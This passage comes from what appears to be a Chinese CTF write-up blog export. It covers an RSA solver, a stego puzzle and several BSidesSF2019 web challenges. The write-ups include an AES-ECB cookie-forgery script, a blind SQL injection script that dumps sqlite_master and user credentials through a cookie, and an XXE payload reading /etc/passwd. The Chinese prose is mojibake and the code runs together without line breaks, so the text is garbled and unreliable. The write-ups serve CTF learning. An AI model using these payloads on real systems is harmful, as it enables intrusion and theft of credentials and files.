16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571key_encode = 154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993p = gmpy2.gcd(n1, n2)q = n1/pe1 = 125794e2 = 42373b = gmpy2.gcd(e1, (p-1)*(q-1))bd = gmpy2.invert(e1/b, (p-1)*(q-1))s = pow(c1, bd, n1)u = pow(s,(p+1)/4,p)v = pow(s,(q+1)/4,q)s = gmpy2.invert(p,q)t = gmpy2.invert(q,p)x = (t*q*u+s*p*v)%n1x2 = -x%n1y = (t*q*u-s*p*v)%n1y2 = -y%n1might_s = [x, x2, y, y2]might_d = []for i in might_s: might_d.append(int(gmpy2.invert(e2, (p-1)*(q-1)*(i-1))))might_key = []for i in range(4): might_key.append(pow(key_encode, might_d[i], p*q*might_s[i])enc = 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809key = 42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276dec = key^encprint libnum.n2s(dec)mask = int('1'*335,2)dec = (dec ^ dec&gt;&gt;200)&amp;maskprint libnum.n2s(dec) Misc-code_in_morseè€ƒå¯ŸåŸºæœ¬çš„æµé‡åˆ†æã€morseç¼–ç ï¼Œbase32è§£ç è½¬å›¾ç‰‡ï¼ŒPDF417å›¾ç‰‡çš„è¯†åˆ«ä»¥åŠF5éšå†™ã€‚ é¢˜ç›®åˆ†ææ‹¿åˆ°æµé‡åŒ…ä¹‹åå¯¼å‡ºHTTPæ•°æ®ï¼Œå‘ç°ä¸€å…±å››ä¸ªæ–‡ä»¶ï¼Œåœ¨PNGæ–‡ä»¶ä¸­æ‹¿åˆ°äº†morseç ï¼Œåˆ°ç½‘ç«™è§£ç å¾—åˆ°ä¸€ä¸²base32ç ï¼Œè¿™ä¸ªæ—¶å€™åˆ°ç½‘ç«™ä¸Šè§£base32è§£ä¸å‡ºæ¥ï¼Œå°±ç”¨pythonè§£äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€å †hexï¼Œå…¶ä¸­è¿˜æœ‰PNGå­—æ ·ï¼Œæ–­å®šæ˜¯å›¾ç‰‡çš„æ•°æ®ï¼Œå†™äº†ä¸ªè„šæœ¬å¯¼å…¥åˆ°pngå›¾ç‰‡ï¼š import base64import binasciib32 = \"RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA====\"hex = base64.b32decode(b32)print(hex)f1 = open(\"1.png\",'wb')f1.write(hex)f1.close() ç„¶åæ‹¿åˆ°äº†å¦‚ä¸‹ä¸€å¼ å›¾ï¼šåæ¥å¾—çŸ¥æ˜¯PDF417ï¼Œç„¶ååˆ°ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æ‰«æçš„æ–¹æ³•ï¼Œè¿™é‡Œå’Œè¿™é‡Œéƒ½å¯ä»¥è¯†åˆ«ï¼Œè¯†åˆ«å‡ºäº†ä¸‹é¢è¿™ä¸ªå›¾ï¼šè¿™é‡Œå¡äº†å¥½ä¹…ï¼Œè¦ä¸æ˜¯å°±æ‹¿åˆ°äº†äºŒè¡€äº†â€¦åæ¥çœ‹åˆ°å›¾ç‰‡çš„æ ‡é¢˜F5å¾—çŸ¥æ˜¯F5éšå†™ï¼Œç„¶åç”¨F5-steganographyè·‘å‡ºäº†flagã€‚ è¿™é‡Œå¶ç„¶é—´å‘ç°äº†ä¸€ä¸ªæ›´å¥½ç”¨çš„å·¥å…·ï¼Œè¾“å…¥morseç å°±ç›´æ¥å‡ºäº†PDF417çš„å›¾ï¼Œåˆ†äº«ä¸€ä¸‹ï¼šCyberChefï¼Œåªèƒ½è¯´ï¼Œå¸ˆå‚…ä»¬tql!","link":"/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/"},{"title":"BSidesSF2019-WriteUp","text":"æœ€è¿‘BUUå¤ç°äº†BSidesSF2019å‡ é“é¢˜ç›®ï¼Œè¿˜æ¯”è¾ƒç®€å•ï¼Œè®°å½•ä¸€ä¸‹ã€‚ Futurellaä¸€é“æŸ¥çœ‹æºç å°±èƒ½æ‹¿åˆ°flagçš„é¢˜ç›®ï¼Œä»¤äººå¼€å¿ƒçš„é¢˜ç›®ã€‚ä¸è¿‡è°·æ­Œç¿»è¯‘æ˜¯çœŸçš„å¼ºï¼Œè¿è¿™ç§ç«æ˜Ÿæ–‡éƒ½èƒ½ç¿»è¯‘ Kookieç®€å•çš„åˆ©ç”¨cookieæ‹¿adminæƒé™çš„é¢˜ç›®ã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®å‘ç°æç¤ºæˆ‘ä»¬è¦ä»¥adminèº«ä»½ç™»å½•ï¼Œä½†åŒæ—¶ä¹Ÿç»™äº†ä¸€ç»„ç”¨æˆ·åå’Œå¯†ç guest/guestï¼Œç”¨è¯¥ç”¨æˆ·ç™»å½•æŠ“åŒ…ï¼Œå‘ç°cookieä¸­å­˜åœ¨å­—æ®µusername=ï¼Œåœ¨åé¢åŠ ä¸Šadminç„¶åæ”¾åŒ…å³å¯æ‹¿åˆ°flagã€‚ Pick-tac-toeè€ƒå¯Ÿæ¡ä»¶ç«äº‰ï¼Œé¢˜å¾ˆç®€å•ã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªä¸‹äº•å­—æ£‹çš„æ£‹ç›˜ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š &lt;table id=\"board\"&gt; &lt;tr&gt; &lt;form id='form_ul' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='ul'&gt; &lt;td id='ul' onClick='$(\"#form_ul\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_u' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='u'&gt; &lt;td id='u' onClick='$(\"#form_u\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_ur' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='ur'&gt; &lt;td id='ur' onClick='$(\"#form_ur\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;form id='form_l' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='l'&gt; &lt;td id='l' onClick='$(\"#form_l\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_c' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='c'&gt; &lt;td id='c' onClick='$(\"#form_c\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_r' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='r'&gt; &lt;td id='r' onClick='$(\"#form_r\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt; &lt;tr&gt; &lt;form id='form_bl' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='bl'&gt; &lt;td id='bl' onClick='$(\"#form_bl\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_b' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='b'&gt; &lt;td id='b' onClick='$(\"#form_b\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;form id='form_br' method='POST' action='/move'&gt; &lt;input type='hidden' name='move' value='br'&gt; &lt;td id='br' onClick='$(\"#form_br\").submit()'&gt; &lt;/td&gt; &lt;/form&gt; &lt;/tr&gt;&lt;/table&gt; å¯ä»¥çŒœæµ‹ç»™å‡ºçš„æ˜¯ä»£è¡¨ä¹ä¸ªç½‘æ ¼ä¼ çš„ä¼ å€¼ï¼Œé€šè¿‡POSTä¼ å‚ï¼Œåœ¨/moveé¡µåˆ©ç”¨moveå‚æ•°ä¼ å‚ä»¥è¡¨ç¤ºæ£‹ä¸‹çš„ä½ç½®ã€‚å½“æˆ‘ä»¬è¿›è¡Œä¼ å‚çš„æ—¶å€™ï¼Œå‘ç°ç»è¿‡ä¸€æ®µæ—¶é—´æ£‹ç›˜ä¸Šæ‰å‡ºç°ï¼Œèµ·åˆä»¥ä¸ºæ˜¯ç½‘é€Ÿé—®é¢˜ï¼Œå…¶å®è¿™æ®µæ—¶é—´æ˜¯æœåŠ¡å™¨å¤„ç†çš„æ—¶é—´ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†ä¼ ä¸¤ä¸ªä½ç½®ï¼Œæ„æˆä¸€æ¡ç›´çº¿ï¼Œè¿™æ ·æœåŠ¡å™¨åªèƒ½å¯¹æˆ‘ä»¬ä¸‹çš„ç¬¬ä¸€æ­¥æ£‹è¿›è¡Œååº”ï¼Œä½†æ˜¯ååº”è¿‡æ¥ï¼Œæˆ‘ä»¬å·²ç»ä¸‹äº†ä¸‰æ­¥æ£‹ï¼Œèµ¢äº†â€¦è¿™å°±æ˜¯å…¸å‹çš„æ¡ä»¶ç«äº‰ã€‚ Mixerè¿™ä¸ªé¢˜ç›®æˆ‘è§‰å¾—è¿˜æ˜¯æœ‰æ°´å¹³çš„ï¼Œä¸»è¦è€ƒå¯Ÿäº†å¯¹cookieçš„æ”»å‡»ï¼Œä½†æ˜¯ç»“åˆäº†AES ECBæ¨¡å¼åŠ å¯†çš„çŸ¥è¯†ï¼Œè¿™å…¶å®ä¹Ÿæ˜¯AESåŠ å¯†æ¨¡å¼ä¸­å¾ˆç®€å•çš„äº†ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œæˆ‘ä»¬å‘ç°åˆæ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼šè¿˜æ˜¯æç¤ºæˆ‘ä»¬è¦æœ‰adminæƒé™ï¼Œæˆ‘ä»¬å°è¯•ç”¨admin/adminç™»å½•ï¼Œå‘ç°å¯ä»¥ç™»å½•ï¼Œä½†æ˜¯ç¬¬ä¸‰ä¸ªæ¡†çš„is_adminçš„å€¼åœ¨è¾“å…¥çš„æ—¶å€™æˆ‘ä»¬ä¸èƒ½è¿›è¡Œæ“ä½œï¼Œä»æŠ“åŒ…æ•ˆæœæ¥çœ‹ï¼Œä¹Ÿä¸èƒ½è¿›è¡Œæ›´æ”¹ï¼šä½†æ˜¯æˆ‘ä»¬å‘ç°cookieä¸­æœ‰userçš„å­—æ®µï¼ŒçŒœæµ‹å…¶åé¢çš„å€¼æ˜¯ç»è¿‡AES ECBæ¨¡å¼åŠ å¯†çš„ï¼Œè¿™é‡Œå¦‚æœéœ€è¦å¯¹åŠ å¯†çš„æœºåˆ¶æœ‰æ›´æ·±çš„ç†è§£ï¼Œå¯ä»¥å»è¿™é‡Œã€‚éªŒè¯ä¸€ä¸‹æˆ‘ä»¬çš„çŒœæµ‹ï¼šé€šè¿‡æ›´æ”¹å…¶ä¸­ä¸€ä¸ªå€¼çœ‹ä¸€ä¸‹å›æ˜¾æˆ‘ä»¬å‘ç°ï¼Œä¼ å…¥çš„ç”¨æˆ·åã€å¯†ç é‚£ä¸‰é¡¹å…¶å®æ˜¯é€šè¿‡JSONä¼ è¾“çš„ï¼Œå³ï¼š {\"username\":\"admin\",\"password\":\"admin\",\"is_admin\":\"0\"} ä»å›¾ä¸­çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬æ›´æ”¹userä¸­çš„ä¸€ä¸ªå€¼çš„æ—¶å€™ï¼Œç»“æœæŠ¥äº†é”™è¯¯ï¼Œå› ä¸ºJSONå­—ç¬¦ä¸²å·²ç»å˜æˆäº†ï¼š {\"first_name\":\"a??N??ZP!z??gF???\":\"admin\",\"is_admin\":0} ä¹Ÿå°±æ˜¯è¯´ç¡®å®æ˜¯å¯¹è¿™ä¸€ä¸²JSONæ ¼å¼çš„å­—ç¬¦ä¸²è¿›è¡Œäº†AES ECBæ¨¡å¼çš„åŠ å¯†ï¼Œå¹¶ä¸”æ˜¯16å­—èŠ‚ä¸ºä¸€ç»„è¿›è¡ŒåŠ å¯†çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è§£é¢˜å°±æœ‰çªç ´å£äº†ã€‚è·å–flagæˆ‘ä»¬éœ€è¦æ„é€ å¦‚ä¸‹çš„JSONä¸²ï¼š {\"username\":\"admin\",\"password\":\"admin\",\"is_admin\":\"1\"} ä½†æ˜¯is_adminçš„å€¼æˆ‘ä»¬æ²¡æ³•é€šè¿‡è¾“å…¥æ¥æ§åˆ¶ï¼Œä½†æ˜¯è§‚å¯Ÿå‘ç°ï¼šä»JSONçš„èµ·å§‹ä½ç½®åˆ°ç”¨æˆ·åçš„ç¬¬ä¸€ä¸ªå­—æ¯åˆšå¥½æ˜¯16ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ ä¸€ä¸ªç±»ä¼¼äºa1.00000000000000(14ä¸ª0ï¼Œä¸€å…±16å­—èŠ‚)çš„ç”¨æˆ·åï¼Œä»¥åŠä¸€ä¸ª4å­—èŠ‚çš„å¯†ç ï¼Œé‚£å°±åˆæ‹¿åˆ°äº†ä¸€ä¸ª16å­—èŠ‚çš„åˆ†ç»„1.00000000000000ï¼Œå¹¶ä¸”å…¶å€¼ä¸º1ï¼ŒåŒæ—¶åˆ°ç¬¬ä¸‰ä¸ª:åˆšå¥½æ˜¯64å­—èŠ‚ï¼Œè€Œè¿›è¡ŒåŠ å¯†çš„æ—¶å€™æ˜¯å¯¹æ•´ä¸ª16å­—èŠ‚çš„å—è¿›è¡ŒåŠ å¯†çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æŠŠè¿™ä¸€ä¸ªåˆ†ç»„åŠ å¯†çš„ç»“æœæ’å…¥åˆ°æœ€åçš„16å­—èŠ‚çš„å¯†æ–‡ä¹‹å‰(hexç¼–ç æ˜¯32ä¸ªå­—ç¬¦)å³å¯ä»¤is_adminçš„å€¼ä¸º1äº†ï¼Œè¿™ä¸ªæ—¶å€™is_adminå…¶å®æ˜¯1.000000000000000(15ä¸ª0)äº†ï¼Œä½†æ˜¯ä¸å½±å“å®ƒæ˜¯1ï¼ŒåŒæ—¶ä¸å½±å“æœ€åä¸€ä¸ªåˆ†ç»„çš„åŠ å¯†(ä¸å¤Ÿ16å­—èŠ‚ä¼šè‡ªåŠ¨å¡«å……çš„)ã€‚ è§£é¢˜æ„é€ username=a1.00000000000000&amp;password=admiç™»å½•ä¹‹åï¼Œåˆ©ç”¨BPæŠ“åŒ…å°†ç¬¬äºŒä¸ª16å­—èŠ‚çš„å¯†æ–‡æ›¿æ¢æ‰æœ€åçš„16å­—èŠ‚çš„å¯†æ–‡ï¼Œæ”¾åŒ…å³å¯æ‹¿åˆ°flagï¼šç”¨ä¸‹é¢çš„è„šæœ¬çš„è¯æ“ä½œèµ·æ¥æ›´ç®€å•ï¼š import requestsfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)url = \"\"action=\"?action=login&amp;first_name=a1.00000000000000&amp;last_name=admi\"r = requests.get(url+action, verify=False, allow_redirects=False)for c in r.cookies: print(c.name, c.value) if c.name == \"user\": c.value = c.value[:-32] + c.value[32:64] + c.value[-32:]resp = requests.get(url, cookies = r.cookies, verify=False, allow_redirects=False)print resp.text Sequelåœ¨cookieå¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œåˆ©ç”¨ç›²æ³¨æ‹¿flagã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªåªå«ç”¨æˆ·åå’Œå¯†ç çš„ç™»å½•æ¡†ï¼Œç»è¿‡å°è¯•guest/guestå¯ä»¥ç™»å½•ï¼Œç™»å½•ä¹‹åå‘ç°æ˜¯ä¸€ä¸ª302è·³è½¬ï¼ŒåŒæ—¶çœ‹åˆ°äº†æœ‰ç‚¹æ€ªçš„cookieï¼šå¯¹cookieçš„å€¼è¿›è¡Œbase64è§£ç ï¼š &gt;&gt;&gt; base64.b64decode(&quot;eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9&quot;)'{&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}' å¯ä»¥çœ‹åˆ°ç”¨æˆ·åå’Œå¯†ç æ˜¯é€šè¿‡JSONç¼–ç ä¼ è¾“çš„ï¼Œé‚£ä¹ˆJSONä¸­çš„usernameæˆ–passwordä¼šä¸ä¼šå­˜åœ¨æ³¨å…¥ç‚¹å‘¢ï¼Ÿåˆ©ç”¨ä¸‹é¢çš„payloadæµ‹è¯•ä¸€ä¸‹ï¼š {\"username\":\"guest\\\" or \\\"A\\\"=\\\"A\",\"password\":\"guest\"} æ³¨æ„è¿™é‡Œçš„\\æ˜¯ç”¨æ¥è½¬ä¹‰çš„ï¼Œé˜²æ­¢åœ¨JSONä¸­è¢«ç¼–ç äº†ã€‚ç„¶åå¯¹ä¸Šé¢çš„JSONä¸²è¿›è¡Œbase64åŠ å¯†ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨pythonçš„åº“è¿›è¡ŒåŠ å¯†ï¼ŒåŒæ—¶ç”¨r''å‘Šè¯‰pythonä¸è¦æŠŠæˆ‘ä»¬æ„é€ çš„\\å†è¿›è¡Œè½¬ä¹‰ï¼š &gt;&gt;&gt; base64.b64encode(r'{&quot;username&quot;:&quot;guest\\&quot; or \\&quot;A\\&quot;=\\&quot;A&quot;,&quot;password&quot;:&quot;guest&quot;}')'eyJ1c2VybmFtZSI6Imd1ZXN0XCIgb3IgXCJBXCI9XCJBIiwicGFzc3dvcmQiOiJndWVzdCJ9' æ›¿æ¢æ‰cookieä¸­çš„å†…å®¹ä¹‹åæ”¾åŒ…å‘ç°å›æ˜¾å¦‚ä¸‹ï¼šå‘ç°æ³¨å…¥æˆåŠŸï¼è¿™é“é¢˜çš„æ•°æ®åº“æ˜¯sqliteï¼Œå¯ä»¥åˆ©ç”¨sqlite_masteræ‹¿åˆ°åº“åï¼Œä»¥ä¾¿è¿›ä¸€æ­¥çš„æ³¨å…¥ã€‚å†™è„šæœ¬åˆ©ç”¨ç›²æ³¨çˆ†åº“åã€è¡¨åã€å­—æ®µåï¼Œæ‹¿flagã€‚è„šæœ¬å¦‚ä¸‹ï¼š import requestsimport stringimport base64URL = ''LETTERS = string.printabletarget = \"\"while True: f = False for e in LETTERS: tmp = target + e # 1.è·å–åº“å payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) # 2.è·å–username #payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) # 3.è·å–password #payload = r'{{\"username\":\"\\\" or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),{},1)=\\\"{}\\\" THEN true ELSE false END or \\\"\",\"password\":\"guest\"}}'.format(len(tmp),e) payload = base64.b64encode(payload.encode('utf-8')).decode(\"utf-8\") req = requests.Request( 'GET', URL, params={ }, cookies={ \"1337_AUTH\":payload } ) prepared = req.prepare() s = requests.Session() r = s.send(prepared, allow_redirects = False) if \"Movie\" in r.text: target = tmp print(target) f = True break if f: continue exit() æ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼šsequeladmin/f5ec3af19f0d3679e7d5a148f4ac323dï¼Œç™»å½•å³å¯æ‹¿åˆ°flagã€‚ SVGMagicè€ƒå¯ŸXXEæ¼æ´ï¼Œåœ¨è§£æåŒ…å«SVGå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢çš„XMLæ–‡ä»¶æ—¶ï¼Œæ„é€ XXEæ¼æ´æ‰§è¡Œä»è€Œæ‹¿åˆ°æœåŠ¡å™¨çš„ç›®æ ‡æ–‡ä»¶ã€‚ çŸ¥è¯†æ‰©å±•SVGå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢å¯ä»¥å‚è€ƒè¿™é‡ŒXXEæ¼æ´å‚è€ƒè¿™é‡Œå’Œè¿™é‡Œ è§£é¢˜è¿›å…¥é¢˜ç›®ï¼Œæç¤ºè¿™ä¸ªç«™å¯ä»¥å®ç°SVGåˆ°PNGçš„è½¬æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸Šä¼ åŒ…å«SVGä¿¡æ¯çš„XMLæ–‡ä»¶ï¼Œé‚£ä¹ˆå°†ä¼šè¿”å›ä¸€å¼ PNGå›¾ç‰‡ã€‚SVGä»£ç ç±»ä¼¼ï¼š &lt;html&gt;&lt;body&gt; &lt;h1&gt;My first SVG&lt;/h1&gt; &lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\"&gt; &lt;circle cx=\"100\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\" /&gt;&lt;/svg&gt; &lt;/body&gt;&lt;/html&gt; æ—¢ç„¶ä¸XMLçš„è§£æç›¸å…³ï¼Œé‚£å°±è€ƒè™‘XXEæ”»å‡»ã€‚é¦–å…ˆæ„é€ å¦‚ä¸‹çš„XMLè„šæœ¬ï¼š &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;&lt;svg height=\"300\" width=\"200\"&gt; &lt;text x=\"0\" y=\"15\" fill=\"red\"&gt;test &amp;xxe; test&lt;/text&gt;&lt;/svg&gt; ä¸Šä¼ ä¹‹åï¼Œå‘ç°å›æ˜¾å¦‚ä¸‹ï¼šç”±æ­¤å¯è§ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„åŒ…å«XXEæ”»å‡»çš„è„šæœ¬æˆåŠŸæ‰§è¡Œäº†ï¼Œç°åœ¨å°±æƒ³åŠæ³•å°±æ‹¿åˆ°flagï¼Œé‚£å°±éœ€è¦æ‰¾åˆ°flagæ–‡ä»¶çš„ä½ç½®ã€‚ 